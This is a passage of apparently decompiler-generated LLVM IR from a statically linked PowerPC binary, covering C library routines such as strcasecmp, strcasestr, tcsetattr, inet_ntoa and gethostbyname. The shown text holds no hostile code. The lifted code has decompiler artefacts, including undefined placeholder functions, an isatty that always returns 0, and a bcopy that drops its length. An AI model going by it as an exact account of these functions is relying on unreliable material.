  %v1_1000a2b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a2b8 = add i32 %v1_1000a2b8, %v0_1000a2ac
  %v3_1000a2c0 = add i32 %v2_1000a2b8, -1
  %v4_1000a2c0 = inttoptr i32 %v3_1000a2c0 to i8*
  store i8 0, i8* %v4_1000a2c0, align 1
  br label %dec_label_pc_1000a2c4

dec_label_pc_1000a2c4:                            ; preds = %dec_label_pc_1000a2a0, %dec_label_pc_1000a2a8
  %v0_1000a2c4 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000a2c4 = icmp eq i32 %v0_1000a2c4, 0
  br i1 %v3_1000a2c4, label %dec_label_pc_1000a2d4, label %dec_label_pc_1000a2cc

dec_label_pc_1000a2cc:                            ; preds = %dec_label_pc_1000a2c4
  %v0_1000a2cc = call i32 @__errno_location()
  %v0_1000a2d0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000a2d0 = inttoptr i32 %v0_1000a2cc to i32*
  store i32 %v0_1000a2d0, i32* %v2_1000a2d0, align 4
  %v0_1000a2d8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a2d4

dec_label_pc_1000a2d4:                            ; preds = %dec_label_pc_1000a2c4, %dec_label_pc_1000a2cc
  %v0_1000a2d8 = phi i32 [ 0, %dec_label_pc_1000a2c4 ], [ %v0_1000a2d8.pre, %dec_label_pc_1000a2cc ]
  ret i32 %v0_1000a2d8

; uselistorder directives
  uselistorder i32 %v2_1000a27c, { 1, 0 }
  uselistorder i32 %v4_1000a270, { 1, 0 }
  uselistorder i32 %v1_1000a278, { 1, 2, 0 }
  uselistorder i32 %v1_1000a214, { 1, 0 }
  uselistorder i32 %v0_1000a1e0, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_10011be0.313 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a2d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a270, { 1, 0 }
  uselistorder label %dec_label_pc_1000a210, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000a2f8 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000a2f8
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000a300 = load i32, i32* bitcast (i32** @global_var_1002350c.316 to i32*), align 4
  %v0_1000a308.pre = load i32, i32* @r3, align 4
  %v1_1000a308.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000a308

dec_label_pc_1000a308:                            ; preds = %dec_label_pc_1000a330, %entry
  %v0_1000a3446 = phi i32 [ %v0_1000a3447, %dec_label_pc_1000a330 ], [ 0, %entry ]
  %v0_1000a334 = phi i32 [ %v1_1000a334, %dec_label_pc_1000a330 ], [ %v1_1000a308.pre, %entry ]
  %v0_1000a338 = phi i32 [ %v1_1000a338, %dec_label_pc_1000a330 ], [ %v0_1000a308.pre, %entry ]
  %v4_1000a308 = icmp eq i32 %v0_1000a338, %v0_1000a334
  %.pre = inttoptr i32 %v0_1000a338 to i8*
  br i1 %v4_1000a308, label %dec_label_pc_1000a330, label %dec_label_pc_1000a310

dec_label_pc_1000a310:                            ; preds = %dec_label_pc_1000a308
  %v2_1000a310 = load i8, i8* %.pre, align 1
  %v3_1000a310 = zext i8 %v2_1000a310 to i32
  %v1_1000a314 = inttoptr i32 %v0_1000a334 to i8*
  %v2_1000a314 = load i8, i8* %v1_1000a314, align 1
  %v3_1000a314 = zext i8 %v2_1000a314 to i32
  %v1_1000a318 = mul nuw nsw i32 %v3_1000a310, 2
  %v1_1000a31c = mul nuw nsw i32 %v3_1000a314, 2
  %v2_1000a320 = add i32 %v1_1000a318, %v3_1000a300
  %v3_1000a320 = inttoptr i32 %v2_1000a320 to i16*
  %v4_1000a320 = load i16, i16* %v3_1000a320, align 2
  %v5_1000a320 = sext i16 %v4_1000a320 to i32
  %v2_1000a324 = add i32 %v1_1000a31c, %v3_1000a300
  %v3_1000a324 = inttoptr i32 %v2_1000a324 to i16*
  %v4_1000a324 = load i16, i16* %v3_1000a324, align 2
  %v5_1000a324 = sext i16 %v4_1000a324 to i32
  %v2_1000a328 = sub nsw i32 %v5_1000a320, %v5_1000a324
  %v4_1000a32c = icmp eq i16 %v4_1000a320, %v4_1000a324
  br i1 %v4_1000a32c, label %dec_label_pc_1000a330, label %dec_label_pc_1000a344

dec_label_pc_1000a330:                            ; preds = %dec_label_pc_1000a308, %dec_label_pc_1000a310
  %v0_1000a3447 = phi i32 [ %v2_1000a328, %dec_label_pc_1000a310 ], [ %v0_1000a3446, %dec_label_pc_1000a308 ]
  %v2_1000a330 = load i8, i8* %.pre, align 1
  %v1_1000a334 = add i32 %v0_1000a334, 1
  %v1_1000a338 = add i32 %v0_1000a338, 1
  %v3_1000a33c = icmp eq i8 %v2_1000a330, 0
  br i1 %v3_1000a33c, label %dec_label_pc_1000a344, label %dec_label_pc_1000a308

dec_label_pc_1000a344:                            ; preds = %dec_label_pc_1000a330, %dec_label_pc_1000a310
  %v0_1000a344 = phi i32 [ %v0_1000a3447, %dec_label_pc_1000a330 ], [ %v2_1000a328, %dec_label_pc_1000a310 ]
  ret i32 %v0_1000a344

; uselistorder directives
  uselistorder i32 %v2_1000a328, { 1, 0 }
  uselistorder i32 %v0_1000a338, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a330, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000a354 = load i32, i32* bitcast (i32** @global_var_1002350c.316 to i32*), align 4
  store i32 %v3_1000a354, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a35c

dec_label_pc_1000a35c:                            ; preds = %dec_label_pc_1000a35c.backedge, %entry
  %v0_1000a35c = phi i32 [ %v0_1000a35c.pre, %dec_label_pc_1000a35c.backedge ], [ %arg2, %entry ]
  %v1_1000a35c = inttoptr i32 %v0_1000a35c to i8*
  %v2_1000a35c = load i8, i8* %v1_1000a35c, align 1
  %v3_1000a35c = zext i8 %v2_1000a35c to i32
  store i32 %v3_1000a35c, i32* %r0.global-to-local, align 4
  %v1_1000a360 = add i32 %v0_1000a35c, 1
  store i32 %v1_1000a360, i32* %r10.global-to-local, align 4
  %v3_1000a364 = icmp eq i8 %v2_1000a35c, 0
  %v1_1000a368 = mul nuw nsw i32 %v3_1000a35c, 2
  store i32 %v1_1000a368, i32* %r9.global-to-local, align 4
  %v0_1000a36c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a364, i32 %v0_1000a36c)
  %v0_1000a370 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a370 = inttoptr i32 %v0_1000a370 to i8*
  %v2_1000a370 = load i8, i8* %v1_1000a370, align 1
  %v3_1000a370 = zext i8 %v2_1000a370 to i32
  %v1_1000a374 = add i32 %v0_1000a370, 1
  store i32 %v1_1000a374, i32* %r8.global-to-local, align 4
  %v0_1000a378 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000a378 = icmp eq i32 %v0_1000a378, %v3_1000a370
  br i1 %v4_1000a378, label %dec_label_pc_1000a35c.backedge, label %dec_label_pc_1000a384

dec_label_pc_1000a35c.backedge:                   ; preds = %dec_label_pc_1000a35c, %dec_label_pc_1000a384, %dec_label_pc_1000a398
  %v0_1000a35c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a35c

dec_label_pc_1000a384:                            ; preds = %dec_label_pc_1000a35c
  %v1_1000a37c = mul nuw nsw i32 %v3_1000a370, 2
  %v0_1000a384 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a384 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a384 = add i32 %v1_1000a384, %v0_1000a384
  %v3_1000a384 = inttoptr i32 %v2_1000a384 to i16*
  %v4_1000a384 = load i16, i16* %v3_1000a384, align 2
  %v5_1000a384 = sext i16 %v4_1000a384 to i32
  store i32 %v5_1000a384, i32* %r9.global-to-local, align 4
  %v2_1000a38c = add i32 %v1_1000a384, %v1_1000a37c
  %v3_1000a38c = inttoptr i32 %v2_1000a38c to i16*
  %v4_1000a38c = load i16, i16* %v3_1000a38c, align 2
  %v5_1000a38c = sext i16 %v4_1000a38c to i32
  store i32 %v5_1000a38c, i32* %r0.global-to-local, align 4
  %v4_1000a390 = icmp eq i16 %v4_1000a384, %v4_1000a38c
  br i1 %v4_1000a390, label %dec_label_pc_1000a35c.backedge, label %dec_label_pc_1000a398

dec_label_pc_1000a398:                            ; preds = %dec_label_pc_1000a384
  %v3_1000a388 = icmp eq i8 %v2_1000a370, 0
  %v0_1000a398 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a398 = add i32 %v0_1000a398, 1
  store i32 %v1_1000a398, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000a398, i32* %r8.global-to-local, align 4
  br i1 %v3_1000a388, label %dec_label_pc_1000a3a8, label %dec_label_pc_1000a35c.backedge

dec_label_pc_1000a3a8:                            ; preds = %dec_label_pc_1000a398
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000a35c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a35c.backedge, { 2, 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10023550.317 to i32), i32* @r5, align 4
  %v1_1000a3b8 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_10023550.317 to i32))
  ret i32 %v1_1000a3b8
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268477392, i32* @lr, align 4
  %v2_1000a3cc = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a3ec = load i32, i32* @lr, align 4
  store i32 %v0_1000a3ec, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a3fc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268477456, i32* @lr, align 4
  %v3_1000a40c = call i32 @ioctl(i32 1076655123, i32 %v2_1000a3fc, i32 %v2_1000a3fc)
  %v2_1000a410 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000a410, i32* @r4, align 4
  store i32 %v3_1000a40c, i32* @r30, align 4
  %v3_1000a414 = icmp eq i32 %v3_1000a40c, 0
  store i32 19, i32* @r5, align 4
  %v0_1000a41c = load i32, i32* @r31, align 4
  br i1 %v3_1000a414, label %dec_label_pc_1000a424, label %dec_label_pc_1000a46c

dec_label_pc_1000a424:                            ; preds = %entry
  %v1_1000a41c = add i32 %v0_1000a41c, 17
  %v4_1000a430 = zext i8 %tmp4 to i32
  store i32 %v4_1000a430, i32* @r8, align 4
  %v3_1000a43c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000a43c, i32* %r0.global-to-local, align 4
  %v2_1000a440 = add i32 %v0_1000a41c, 4
  %v3_1000a440 = inttoptr i32 %v2_1000a440 to i32*
  store i32 %tmp7, i32* %v3_1000a440, align 4
  %v0_1000a444 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a444 = load i32, i32* @r31, align 4
  %v2_1000a444 = inttoptr i32 %v1_1000a444 to i32*
  store i32 %v0_1000a444, i32* %v2_1000a444, align 4
  %v0_1000a448 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a448 = load i32, i32* @r31, align 4
  %v2_1000a448 = add i32 %v1_1000a448, 8
  %v3_1000a448 = inttoptr i32 %v2_1000a448 to i32*
  store i32 %v0_1000a448, i32* %v3_1000a448, align 4
  %v0_1000a44c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a44c = load i32, i32* @r31, align 4
  %v2_1000a44c = add i32 %v1_1000a44c, 12
  %v3_1000a44c = inttoptr i32 %v2_1000a44c to i32*
  store i32 %v0_1000a44c, i32* %v3_1000a44c, align 4
  %v3_1000a450 = load i32, i32* @r31, align 4
  %v4_1000a450 = add i32 %v3_1000a450, 16
  %v5_1000a450 = inttoptr i32 %v4_1000a450 to i8*
  store i8 %tmp4, i8* %v5_1000a450, align 1
  %v1_1000a454 = load i32, i32* @r31, align 4
  %v2_1000a454 = add i32 %v1_1000a454, 52
  %v3_1000a454 = inttoptr i32 %v2_1000a454 to i32*
  store i32 %tmp3, i32* %v3_1000a454, align 4
  %v1_1000a458 = load i32, i32* @r31, align 4
  %v2_1000a458 = add i32 %v1_1000a458, 56
  %v3_1000a458 = inttoptr i32 %v2_1000a458 to i32*
  store i32 %tmp2, i32* %v3_1000a458, align 4
  store i32 268477536, i32* @lr, align 4
  %v6_1000a45c = sext i8 %tmp4 to i32
  %v8_1000a45c = call i32 @__GI_mempcpy(i32 %v1_1000a41c, i32 %v2_1000a410, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000a45c, i32 %tmp7)
  store i32 268477548, i32* @lr, align 4
  %v3_1000a468 = call i32 @__GI_memset(i32 %v8_1000a45c, i32 0, i32 13)
  %v0_1000a470.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a46c

dec_label_pc_1000a46c:                            ; preds = %entry, %dec_label_pc_1000a424
  %v0_1000a470 = phi i32 [ %v3_1000a40c, %entry ], [ %v0_1000a470.pre, %dec_label_pc_1000a424 ]
  store i32 %v0_1000a3ec, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a470

; uselistorder directives
  uselistorder i32 %v2_1000a3fc, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a46c, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a484 = load i32, i32* @r4, align 4
  %v3_1000a484 = icmp eq i32 %v0_1000a484, 1
  %v0_1000a494 = load i32, i32* @r3, align 4
  store i32 %v0_1000a494, i32* @r27, align 4
  %v0_1000a49c = load i32, i32* @r5, align 4
  store i32 %v0_1000a49c, i32* @r31, align 4
  br i1 %v3_1000a484, label %dec_label_pc_1000a4c0, label %dec_label_pc_1000a4a4

dec_label_pc_1000a4a4:                            ; preds = %entry
  %v3_1000a4a4 = icmp eq i32 %v0_1000a484, 2
  br i1 %v3_1000a4a4, label %dec_label_pc_1000a4e0, label %dec_label_pc_1000a4ac

dec_label_pc_1000a4ac:                            ; preds = %dec_label_pc_1000a4a4
  %v3_1000a4ac = icmp eq i32 %v0_1000a484, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000a4ac, label %dec_label_pc_1000a4e8, label %dec_label_pc_1000a4cc

dec_label_pc_1000a4c0:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000a4e8

dec_label_pc_1000a4cc:                            ; preds = %dec_label_pc_1000a4ac
  %v0_1000a4cc = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000a4d8 = inttoptr i32 %v0_1000a4cc to i32*
  store i32 22, i32* %v2_1000a4d8, align 4
  br label %dec_label_pc_1000a5d0

dec_label_pc_1000a4e0:                            ; preds = %dec_label_pc_1000a4a4
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000a4e8

dec_label_pc_1000a4e8:                            ; preds = %dec_label_pc_1000a4ac, %dec_label_pc_1000a4c0, %dec_label_pc_1000a4e0
  %v1_1000a4e8 = inttoptr i32 %v0_1000a49c to i32*
  %v2_1000a4e8 = load i32, i32* %v1_1000a4e8, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000a4f0 = add i32 %v0_1000a49c, 4
  %v2_1000a4f0 = inttoptr i32 %v1_1000a4f0 to i32*
  %v3_1000a4f0 = load i32, i32* %v2_1000a4f0, align 4
  store i32 %v3_1000a4f0, i32* %r9.global-to-local, align 4
  %v1_1000a4f4 = add i32 %v0_1000a49c, 17
  store i32 %v1_1000a4f4, i32* @r4, align 4
  %v1_1000a4f8 = add i32 %v0_1000a49c, 8
  %v2_1000a4f8 = inttoptr i32 %v1_1000a4f8 to i32*
  %v3_1000a4f8 = load i32, i32* %v2_1000a4f8, align 4
  %v2_1000a4fc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000a4fc, i32* @r3, align 4
  %v2_1000a504 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000a504, i32* @r26, align 4
  %v1_1000a508 = add i32 %v0_1000a49c, 16
  %v2_1000a508 = inttoptr i32 %v1_1000a508 to i8*
  %v3_1000a508 = load i8, i8* %v2_1000a508, align 1
  %v4_1000a508 = zext i8 %v3_1000a508 to i32
  store i32 %v4_1000a508, i32* @r8, align 4
  store i32 %v2_1000a4e8, i32* %stack_var_-72, align 4
  store i32 268477748, i32* @lr, align 4
  %v0_1000a530 = call i32 @memcpy()
  %v0_1000a534 = load i32, i32* @r27, align 4
  %v0_1000a538 = load i32, i32* @r30, align 4
  store i32 268477768, i32* @lr, align 4
  %v3_1000a544 = call i32 @ioctl(i32 %v0_1000a534, i32 %v0_1000a538, i32 %v2_1000a504)
  store i32 %v3_1000a544, i32* @r28, align 4
  %v3_1000a548 = icmp eq i32 %v3_1000a544, 0
  br i1 %v3_1000a548, label %dec_label_pc_1000a550, label %dec_label_pc_1000a5d0

dec_label_pc_1000a550:                            ; preds = %dec_label_pc_1000a4e8
  %v0_1000a550 = load i32, i32* @r30, align 4
  %v3_1000a554 = icmp eq i32 %v0_1000a550, -2144570348
  br i1 %v3_1000a554, label %dec_label_pc_1000a55c, label %dec_label_pc_1000a5cc

dec_label_pc_1000a55c:                            ; preds = %dec_label_pc_1000a550
  %v0_1000a55c = call i32 @__errno_location()
  store i32 %v0_1000a55c, i32* @r29, align 4
  %v0_1000a56c = load i32, i32* @r27, align 4
  %v1_1000a574 = inttoptr i32 %v0_1000a55c to i32*
  %v2_1000a574 = load i32, i32* %v1_1000a574, align 4
  store i32 %v2_1000a574, i32* @r30, align 4
  store i32 268477824, i32* @lr, align 4
  %v3_1000a57c = call i32 @ioctl(i32 %v0_1000a56c, i32 1076655123, i32 %v2_1000a504)
  %v3_1000a580 = icmp eq i32 %v3_1000a57c, 0
  br i1 %v3_1000a580, label %dec_label_pc_1000a590, label %dec_label_pc_1000a588

dec_label_pc_1000a588:                            ; preds = %dec_label_pc_1000a55c
  %v0_1000a588 = load i32, i32* @r30, align 4
  %v1_1000a588 = load i32, i32* @r29, align 4
  %v2_1000a588 = inttoptr i32 %v1_1000a588 to i32*
  store i32 %v0_1000a588, i32* %v2_1000a588, align 4
  br label %dec_label_pc_1000a5d0

dec_label_pc_1000a590:                            ; preds = %dec_label_pc_1000a55c
  %v0_1000a590 = load i32, i32* @r31, align 4
  %v1_1000a590 = add i32 %v0_1000a590, 8
  %v2_1000a590 = inttoptr i32 %v1_1000a590 to i32*
  %v3_1000a590 = load i32, i32* %v2_1000a590, align 4
  %v1_1000a598 = call i32 @__asm_rlwinm(i32 %v3_1000a590, i32 0, i32 19, i32 20)
  %v1_1000a59c = call i32 @__asm_rlwinm(i32 %v3_1000a4f8, i32 0, i32 19, i32 20)
  store i32 %v1_1000a59c, i32* %r9.global-to-local, align 4
  %v4_1000a5a0 = icmp eq i32 %v1_1000a598, %v1_1000a59c
  br i1 %v4_1000a5a0, label %dec_label_pc_1000a5a8, label %dec_label_pc_1000a5bc

dec_label_pc_1000a5a8:                            ; preds = %dec_label_pc_1000a590
  %v1_1000a5a8 = and i32 %v3_1000a590, 768
  store i32 %v1_1000a5a8, i32* %r9.global-to-local, align 4
  %v3_1000a5a8 = icmp eq i32 %v1_1000a5a8, 0
  br i1 %v3_1000a5a8, label %dec_label_pc_1000a5cc, label %dec_label_pc_1000a5b0

dec_label_pc_1000a5b0:                            ; preds = %dec_label_pc_1000a5a8
  %v1_1000a5b0 = call i32 @__asm_rlwinm(i32 %v3_1000a4f8, i32 0, i32 22, i32 23)
  %v0_1000a5b4 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000a5b4 = icmp eq i32 %v0_1000a5b4, %v1_1000a5b0
  br i1 %v4_1000a5b4, label %dec_label_pc_1000a5cc, label %dec_label_pc_1000a5bc

dec_label_pc_1000a5bc:                            ; preds = %dec_label_pc_1000a590, %dec_label_pc_1000a5b0
  store i32 -1, i32* @r28, align 4
  %v1_1000a5c4 = load i32, i32* @r29, align 4
  %v2_1000a5c4 = inttoptr i32 %v1_1000a5c4 to i32*
  store i32 22, i32* %v2_1000a5c4, align 4
  br label %dec_label_pc_1000a5d0

dec_label_pc_1000a5cc:                            ; preds = %dec_label_pc_1000a550, %dec_label_pc_1000a5b0, %dec_label_pc_1000a5a8
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000a5d0

dec_label_pc_1000a5d0:                            ; preds = %dec_label_pc_1000a4e8, %dec_label_pc_1000a588, %dec_label_pc_1000a4cc, %dec_label_pc_1000a5bc, %dec_label_pc_1000a5cc
  %v0_1000a5d4 = load i32, i32* @r28, align 4
  ret i32 %v0_1000a5d4

; uselistorder directives
  uselistorder i32 %v0_1000a49c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 4, 5, 6, 0, 7, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a5d0, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a5cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a5bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4e8, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000a5e8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a5e8
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000a5ec = load i32, i32* @r3, align 4
  ret i32 %v0_1000a5ec
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000a5f0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a5f0
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000a5f4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000a5f4
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000a600 = add i32 %arg2, 15
  store i32 %v1_1000a600, i32* %r4.global-to-local, align 4
  %v2_1000a614 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a614, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a61c

dec_label_pc_1000a61c:                            ; preds = %dec_label_pc_1000a640.dec_label_pc_1000a61c_crit_edge, %entry
  %v0_1000a61c = phi i32 [ %v2_1000a614, %entry ], [ %v0_1000a61c.pre, %dec_label_pc_1000a640.dec_label_pc_1000a61c_crit_edge ]
  %v0_1000a6608 = phi i32 [ %v1_1000a600, %entry ], [ %v0_1000a640, %dec_label_pc_1000a640.dec_label_pc_1000a61c_crit_edge ]
  %v1_1000a61c = urem i32 %v0_1000a61c, 256
  %v5_1000a624 = inttoptr i32 %v0_1000a6608 to i8*
  %v6_1000a624 = call i32 @_uintmaxtostr(i8* %v5_1000a624, i32 0, i32 %v1_1000a61c, i32 -10, i32 0)
  %v0_1000a628 = load i32, i32* @r30, align 4
  %v3_1000a628 = icmp eq i32 %v0_1000a628, 0
  %v0_1000a62c = load i32, i32* @r31, align 4
  %v1_1000a62c = udiv i32 %v0_1000a62c, 256
  store i32 %v1_1000a62c, i32* %r31.global-to-local, align 4
  %v1_1000a630 = add i32 %v6_1000a624, -1
  store i32 %v1_1000a630, i32* %r4.global-to-local, align 4
  br i1 %v3_1000a628, label %dec_label_pc_1000a640, label %dec_label_pc_1000a638

dec_label_pc_1000a638:                            ; preds = %dec_label_pc_1000a61c
  %v3_1000a63c = inttoptr i32 %v0_1000a628 to i8*
  store i8 46, i8* %v3_1000a63c, align 1
  %v0_1000a640.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a640

dec_label_pc_1000a640:                            ; preds = %dec_label_pc_1000a61c, %dec_label_pc_1000a638
  %v0_1000a640 = phi i32 [ %v1_1000a630, %dec_label_pc_1000a61c ], [ %v0_1000a640.pre, %dec_label_pc_1000a638 ]
  %v0_1000a644.pre = load i32, i32* @r29, align 4
  store i32 0, i32* @r8, align 4
  %v1_1000a654 = add i32 %v0_1000a644.pre, 1
  store i32 %v1_1000a654, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000a644.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000a640.dec_label_pc_1000a61c_crit_edge, label %dec_label_pc_1000a65c

dec_label_pc_1000a640.dec_label_pc_1000a61c_crit_edge: ; preds = %dec_label_pc_1000a640
  %v0_1000a61c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a61c

dec_label_pc_1000a65c:                            ; preds = %dec_label_pc_1000a640
  %v1_1000a660 = add i32 %v0_1000a640, 1
  ret i32 %v1_1000a660

; uselistorder directives
  uselistorder i32 %v0_1000a644.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a640, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000a688 = load i32, i32* %arg1, align 4
  store i32 %v2_1000a688, i32* %stack_var_-8, align 4
  store i32 268478104, i32* @lr, align 4
  %v3_1000a694 = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_100295b0.318 to i32))
  ret i32 %v3_1000a694
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000a6b0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000a6b0, i32* @r4, align 4
  store i32 268478140, i32* @lr, align 4
  %v1_1000a6b8 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000a6b8 = call i32 @inet_aton(i8* %v1_1000a6b8)
  %v3_1000a6bc = icmp eq i32 %v2_1000a6b8, 0
  br i1 %v3_1000a6bc, label %dec_label_pc_1000a6cc, label %dec_label_pc_1000a6c8

dec_label_pc_1000a6c8:                            ; preds = %entry
  %v3_1000a6c8 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000a6cc

dec_label_pc_1000a6cc:                            ; preds = %entry, %dec_label_pc_1000a6c8
  %v0_1000a6d8 = phi i32 [ -1, %entry ], [ %v3_1000a6c8, %dec_label_pc_1000a6c8 ]
  ret i32 %v0_1000a6d8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a6cc, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000a6f0 = call i32 @__GI___h_errno_location()
  %v2_1000a700 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268478232, i32* @lr, align 4
  %v7_1000a714 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_1002978c.319, i32 ptrtoint (i32* @global_var_100295c0.320 to i32), i32 460, i32 %v2_1000a700, i32 %v0_1000a6f0)
  %v3_1000a71c = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000a71c
}

